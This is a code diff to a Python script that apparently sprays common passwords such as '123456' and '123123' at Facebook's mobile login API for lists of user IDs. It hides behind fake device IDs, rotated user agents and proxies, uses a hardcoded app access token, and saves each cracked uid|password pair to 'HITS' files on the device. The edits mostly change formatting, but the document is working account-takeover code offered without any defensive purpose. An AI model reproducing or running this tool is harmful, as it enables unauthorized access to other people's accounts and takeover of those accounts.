@@ -71,21 +71,21 @@ def _build_headers_1(ua):
         }
     elif is_mobile_ua():
         return {
-            'User-Agent':    ua,
-            'Content-Type':  'application/x-www-form-urlencoded',
-            'Host':          'graph.facebook.com',
-            'Accept':        'application/json',
+            'User-Agent':      ua,
+            'Content-Type':    'application/x-www-form-urlencoded',
+            'Host':            'graph.facebook.com',
+            'Accept':          'application/json',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Connection':    'keep-alive',
+            'Connection':      'keep-alive',
         }
     else:
         return {
-            'User-Agent':    ua,
-            'Content-Type':  'application/x-www-form-urlencoded',
-            'Host':          'graph.facebook.com',
-            'Accept':        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'User-Agent':      ua,
+            'Content-Type':    'application/x-www-form-urlencoded',
+            'Host':            'graph.facebook.com',
+            'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Connection':    'keep-alive',
+            'Connection':      'keep-alive',
         }
 
 
@@ -105,19 +105,19 @@ def _build_headers_2(ua):
         }
     elif is_mobile_ua():
         return {
-            'user-agent':    ua,
-            'content-type':  'application/x-www-form-urlencoded',
-            'accept':        'application/json',
+            'user-agent':      ua,
+            'content-type':    'application/x-www-form-urlencoded',
+            'accept':          'application/json',
             'accept-language': 'en-US,en;q=0.9',
-            'connection':    'keep-alive',
+            'connection':      'keep-alive',
         }
     else:
         return {
-            'user-agent':    ua,
-            'content-type':  'application/x-www-form-urlencoded',
-            'accept':        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'user-agent':      ua,
+            'content-type':    'application/x-www-form-urlencoded',
+            'accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.5',
-            'connection':    'keep-alive',
+            'connection':      'keep-alive',
         }
 
 
@@ -127,30 +127,30 @@ def login_1(uid):
     try:
         for pw in ('123456', '1234567', '12345678', '123456789'):
             _status_line(1)
-            ids  = fake_device_ids()
-            ua   = get_ua()
+            ids = fake_device_ids()
+            ua  = get_ua()
             data = {
-                'adid':                     ids['adid'],
-                'format':                   'json',
-                'device_id':                ids['device_id'],
-                'cpl':                      'true',
-                'family_device_id':         ids['family_device_id'],
-                'credentials_type':         'device_based_login_password',
-                'error_detail_type':        'button_with_disabled',
-                'source':                   'device_based_login',
-                'email':                    str(uid),
-                'password':                 str(pw),
-                'access_token':             '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta':          '',
-                'advertiser_id':            ids['advertiser_id'],
+                'adid':                       ids['adid'],
+                'format':                     'json',
+                'device_id':                  ids['device_id'],
+                'cpl':                        'true',
+                'family_device_id':           ids['family_device_id'],
+                'credentials_type':           'device_based_login_password',
+                'error_detail_type':          'button_with_disabled',
+                'source':                     'device_based_login',
+                'email':                      str(uid),
+                'password':                   str(pw),
+                'access_token':               '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies':   '1',
+                'meta_inf_fbmeta':            '',
+                'advertiser_id':              ids['advertiser_id'],
                 'currently_logged_in_userid': '0',
-                'locale':                   'en_US',
-                'client_country_code':      'US',
-                'method':                   'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class':      'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key':                  '882a8490361da98702bf97a021ddc14d',
+                'locale':                     'en_US',
+                'client_country_code':        'US',
+                'method':                     'auth.login',
+                'fb_api_req_friendly_name':   'authenticate',
+                'fb_api_caller_class':        'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key':                    '882a8490361da98702bf97a021ddc14d',
             }
             res = session.post(
                 'https://b-graph.facebook.com/auth/login',
@@ -161,37 +161,40 @@ def login_1(uid):
                 open('/sdcard/KABBO-M1-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                 add_ok(uid)
                 break
-        inc_loop()
     except Exception:
         time.sleep(5)
+    finally:
+        inc_loop()
 
 
 def login_2(uid):
     _proxy = next_proxy() or {}
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        _status_line(2)
-        try:
-            with requests.Session() as session:
-                session.proxies = _proxy
-                ua  = get_ua()
-                url = (
-                    f"https://b-api.facebook.com/method/auth.login?format=json"
-                    f"&email={uid}&password={pw}"
-                    f"&credentials_type=device_based_login_password"
-                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
-                    f"&source=device_based_login&meta_inf_fbmeta=%20"
-                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
-                    f"&client_country_code=US"
-                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
-                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
-                )
-                po = session.get(url, headers=_build_headers_2(ua)).json()
-                if 'session_key' in str(po):
-                    _hit_line(2, uid, pw)
-                    open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
-                    add_ok(uid)
-                    break
-        except Exception:
-            pass
-    inc_loop()
+    try:
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+            _status_line(2)
+            try:
+                with requests.Session() as session:
+                    session.proxies = _proxy
+                    ua  = get_ua()
+                    url = (
+                        f"https://b-api.facebook.com/method/auth.login?format=json"
+                        f"&email={uid}&password={pw}"
+                        f"&credentials_type=device_based_login_password"
+                        f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
+                        f"&source=device_based_login&meta_inf_fbmeta=%20"
+                        f"&currently_logged_in_userid=0&method=GET&locale=en_US"
+                        f"&client_country_code=US"
+                        f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
+                        f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                        f"&fb_api_req_friendly_name=authenticate&cpl=true"
+                    )
+                    po = session.get(url, headers=_build_headers_2(ua)).json()
+                    if 'session_key' in str(po):
+                        _hit_line(2, uid, pw)
+                        open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
+                        add_ok(uid)
+                        break
+            except Exception:
+                pass
+    finally:
+        inc_loop()
